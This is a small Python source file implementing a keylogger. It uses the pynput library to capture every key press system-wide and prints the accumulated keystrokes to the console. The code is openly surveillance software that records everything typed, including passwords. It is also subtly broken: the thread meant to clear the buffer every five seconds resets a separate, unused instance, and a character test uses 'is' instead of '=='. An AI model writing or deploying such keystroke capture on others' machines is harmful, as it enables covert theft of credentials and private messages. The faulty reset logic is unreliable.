import time
from pynput.keyboard import Listener
import threading

input_buffer = ''  # a buffer to store inserted keys ( Resets each 5 sec )


# this class run a thread to clear input buffer each 5 sec:
class _BufferThread(threading.Thread):
    def __init__(self):
        super().__init__()

    def run(self):
        logger = Keylogger()
        while True:
            time.sleep(5)  # wait for 5 sec
            logger.reset_buffer()


class Keylogger():
    def __init__(self):
        self.input_buffer = ''

    # this function resets buffer whenever it is called
    def reset_buffer(self):
        self.input_buffer = ''

    # this function is called whenever a key is pressed on keyboard ( with help of listener)
    def on_press(self, key):
        if str(key)[
            0] is '\'':  # if a normal key is pressed like 's' ---> we save s instead of 's' (removing first and last letter)
            self.input_buffer += str(key)[1:-1]
        else:
            self.input_buffer += str(key)
        print(self.input_buffer)

    # our main function that starts when we run our code
    def start(self):
        buffer_thread = _BufferThread()  # creating object of our thread
        buffer_thread.start()  # start our thread
        with Listener(
                on_press=self.on_press) as listener:  # listener to listen key pressing and calling on_press function
            listener.join()
